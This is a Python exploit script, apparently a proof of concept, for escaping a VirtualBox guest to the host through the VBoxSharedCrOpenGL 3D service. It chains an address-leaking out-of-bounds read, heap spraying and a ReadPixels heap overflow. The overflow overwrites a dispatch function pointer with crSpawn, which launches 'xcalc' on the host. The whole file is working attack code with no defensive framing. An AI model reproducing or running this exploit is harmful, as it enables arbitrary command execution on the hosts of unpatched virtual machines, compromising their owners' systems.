import sys, os
from struct import pack, unpack
sys.path.append(os.path.abspath(os.path.dirname(__file__)) + '/lib')
from chromium import *

def make_leak_msg(offset):
    msg = (
            pack('<III', CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\x00\x00\x00' + chr(CR_EXTEND_OPCODE)
            + pack('<I', offset)
            + pack('<I', CR_GETATTRIBLOCATION_EXTEND_OPCODE)
            + pack('<I', 0x41424344)
            )
    return msg


def leak_cr_server(client):
    msg = make_leak_msg(0xffffeb38)
    
    for _ in range(0x2000):
        alloc_buf(client, 0x20, 'AAAAAAAA')
    
    new_client = hgcm_connect('VBoxSharedCrOpenGL')
    data = crmsg(client, msg, 0x50)
    cr_server = unpack('<Q', data[16:24])[0] - 0x4a70
    
    print('[+] cr_server_addr @ ' + hex(cr_server))
    return cr_server


def make_readpixel_msg():
    msg = (
            pack('<III', CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\x00\x00\x00' + chr(CR_READPIXELS_OPCODE)
            + 'AAAA' + 'BBBB' + 'CCCC'
            + pack('<I', 8) # height
            + pack('<I', 0x35) # chunk_header_size
            + pack('<I', 0) + 'GGGG' + 'HHHH'
            + 'IIII'
            + pack('<I', 0)
            + pack('<I', 0x1ffffffd) # bytes_per_row
            + pack('<I', 0)
            + pack('<I', 0xdeadbeef) # id
            + pack('<I', 0xffffffff) # size
            )
    return msg
    

def call_readpixels(client):
    buf_ids = []

    for _ in range(0x2000):
        id = alloc_buf(client, 0x20, 'BBBBBBBB')
        buf_ids.insert(0, id)
    
    # print(buf_ids)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf_ids[-2], "A", 1])
    
    # heap overflow
    msg = make_readpixel_msg()
    crmsg(client, msg)


def leak_conn(client):
    # Spray some buffers of sizes
    #  0x290 = sizeof(CRConnection) and
    #  0x9d0 = sizeof(CRClient)
    for _ in range(600):
        alloc_buf(client, 0x290)
    for _ in range(600):
        alloc_buf(client, 0x9d0)

    # This will allocate a CRClient and CRConnection right next to each other.
    new_client = hgcm_connect("VBoxSharedCrOpenGL")

    for _ in range(2):
        alloc_buf(client, 0x290)
    for _ in range(2):
        alloc_buf(client, 0x9d0)

    hgcm_disconnect(new_client)

    # Leak crVBoxHGCMAlloc address and compute base address of hostcrutil
    msg = make_leak_msg(0xd0)
    data = crmsg(client, msg, 0x290)
    leak_addr = unpack('<Q', data[16:24])[0] - 0x20670
    print('[+] VBoxOGLhostcrutil @ ' + hex(leak_addr))
    return leak_addr


def make_cr_spawn_msg(cmd):
    msg = (
        pack('<III', CR_MESSAGE_OPCODES, 0x41414141, 1)
        + '\x00\x00\x00' + chr(CR_BOUNDSINFOCR_OPCODE)
        + pack('<I', 0)
        + 'xcal'
        + 'c\x00\x00\x00'
        + pack('<I', 0x0)
        + pack('<I', 0x0)
        + pack('<I', 0x0)
        + pack('<Q', cmd)
        + pack('<Q', 0)*6
        )
    return msg


def pwn(client, client_2):
    # leak address of cr_server
    cr_server_addr = leak_cr_server(client)
    print('[+] cr_unpackDispatch.BoundsInfoCR @ ' + hex(cr_server_addr + 0xae98))

    # leak base address of host_cr_util
    host_cr_util = leak_conn(client)
    cr_spawn = host_cr_util + 0x14510
    print('[+] VBoxOGLhostcrutil!crSpawn @ ' + hex(cr_spawn))
    
    call_readpixels(client)

    # overwrite svcBuffer_t->pData
    # with the address of cr_unpackDispatch.BoundsInfoCR
    payload = '\x90'*0x20
    payload += pack('<Q', 0)
    payload += pack('<Q', 0x35)
    payload += pack('<I', 0xbeefdead)
    payload += pack('<I', 0xffffffff)
    payload += pack('<Q', cr_server_addr + 0xae98)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0xffffffff, 0, payload])
   
    # overwrite cr_unpackDispatch.BoundsInfoCR
    # with crSpawn
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xbeefdead, 0xffffffff, 0, pack('<Q', cr_spawn)])
    
    # leak heap address and insert 'xcalc'
    alloc_buf(client, 0x20, pack('<Q', 0x12345678))
    alloc_buf(client, 0x20, 'xcalc\x00')
    msg = make_leak_msg(0xffffff78)
    arg_addr = unpack('<Q', crmsg(client, msg)[16:24])[0]
    print('[+] arg addr @ ' + hex(arg_addr))
        
    # call crSpawn
    msg = make_cr_spawn_msg(arg_addr)
    crmsg(client, msg)

if __name__ == '__main__':
        client_1 = hgcm_connect('VBoxSharedCrOpenGL')
        set_version(client_1)
        client_2 = hgcm_connect('VBoxSharedCrOpenGL')
        set_version(client_2)
        pwn(client_1, client_2)                       
	hgcm_disconnect(client_1)
	hgcm_disconnect(client_2)
